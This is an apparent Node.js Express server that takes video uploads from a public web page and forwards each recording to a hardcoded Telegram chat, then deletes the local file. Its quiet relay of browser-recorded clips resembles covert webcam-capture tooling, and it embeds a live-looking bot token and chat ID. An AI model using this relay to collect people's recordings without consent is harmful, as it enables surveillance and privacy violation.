const express = require("express");
const multer = require("multer");
const fs = require("fs");
const { Telegraf } = require("telegraf");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Ensure the uploads directory exists
const uploadDir = "uploads";
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// Multer configuration for file uploads
const storage = multer.diskStorage({
  destination: uploadDir,
  filename: function (req, file, cb) {
    // Force MP4 extension regardless of content type
    const safeFilename = `${Date.now()}-video.mp4`;
    cb(null, safeFilename);
  },
});

const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB to accommodate larger videos
const ALLOWED_MIME_TYPES = ["video/webm", "video/mp4", "video/x-matroska", "application/octet-stream"];

const upload = multer({
  storage: storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (req, file, cb) => {
    console.log("Received file:", file.originalname, "with mimetype:", file.mimetype);
    
    // Accept any video type or application/octet-stream (used by some browsers)
    if (ALLOWED_MIME_TYPES.includes(file.mimetype) || file.mimetype.startsWith('video/')) {
      cb(null, true);
    } else {
      console.warn("Rejected file with mimetype:", file.mimetype);
      cb(new Error("Invalid file type. Only video files are allowed."));
    }
  },
});

// Telegram bot setup
const TELEGRAM_TOKEN = "8140014307:AAGmV5Vti6JHteOq6U98f9zCba9BdRV3UMQ"; // Your bot token
const TELEGRAM_CHAT_ID = "7239162339"; // Your chat ID
const bot = new Telegraf(TELEGRAM_TOKEN);

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, "public")));

// Handle video uploads
app.post("/upload", upload.single("video"), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: "No file uploaded or invalid file type." });
  }

  console.log("Video received:", req.file);
  console.log("Video saved at:", req.file.path);
  console.log("File size:", req.file.size, "bytes");
  console.log("MIME type:", req.file.mimetype);

  // Verify the file exists and is readable
  fs.access(req.file.path, fs.constants.F_OK | fs.constants.R_OK, (err) => {
    if (err) {
      console.error("File does not exist or is not readable:", err);
      return res.status(500).json({ error: "Error saving file." });
    }

    // Send response to client immediately to prevent timeout
    res.json({ success: true, message: "Video uploaded successfully." });

    // Add a longer delay before sending to Telegram to ensure file is fully written
    setTimeout(() => {
      try {
        // Get file stats to verify size
        const stats = fs.statSync(req.file.path);
        if (stats.size < 100) {
          console.error("File too small, might be corrupted:", stats.size, "bytes");
          return;
        }

        console.log("File ready to send, size:", stats.size, "bytes");
        
        // Send video to Telegram with caption to identify each video
        const caption = `Video recorded at: ${new Date().toISOString()}`;
        
        // Send as video first for better mobile compatibility
        bot.telegram
          .sendVideo(TELEGRAM_CHAT_ID, 
            { 
              source: req.file.path,
              filename: `video_${Date.now()}.mp4`,
              caption: caption,
              supports_streaming: true
            })
          .then(() => {
            console.log("Video sent to Telegram successfully as video.");
          })
          .catch((err) => {
            console.error("Telegram sendVideo error:", err);
            
            // Fallback to sendDocument if sendVideo fails
            console.log("Trying fallback to document method...");
            return bot.telegram.sendDocument(TELEGRAM_CHAT_ID, 
              { 
                source: req.file.path,
                filename: `video_${Date.now()}.mp4`,
                caption: caption + " (fallback method)"
              });
          })
          .finally(() => {
            // Add a small delay before deleting the file
            setTimeout(() => {
              fs.unlink(req.file.path, (err) => {
                if (err) console.error("Error deleting original file:", err);
              });
            }, 2000);
          });
      } catch (error) {
        console.error("Error processing video file:", error);
      }
    }, 1500);
  });
});

// Start the server with port retry logic
function startServer(retryPort) {
  const server = app.listen(retryPort, "0.0.0.0", () => {
    console.log(`Server running on port ${retryPort}`);
  }).on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
      console.log(`Port ${retryPort} is busy, trying ${retryPort + 1}...`);
      startServer(retryPort + 1);
    } else {
      console.error("Server error:", e);
    }
  });
}

startServer(port);